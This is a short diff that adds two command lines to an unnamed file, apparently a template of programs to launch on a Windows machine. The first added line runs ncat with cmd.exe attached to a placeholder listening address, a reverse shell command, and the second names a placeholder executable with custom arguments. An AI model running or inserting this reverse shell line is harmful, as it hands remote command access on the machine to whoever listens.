@@ -1,1 +1,2 @@
- 
+ C:\Users\user\Desktop\ncat.exe -e cmd.exe <listening IP> <listening port>
+ C:\Users\user\Desktop\your_second_executable.exe custom_argument_1 custom_argument_2
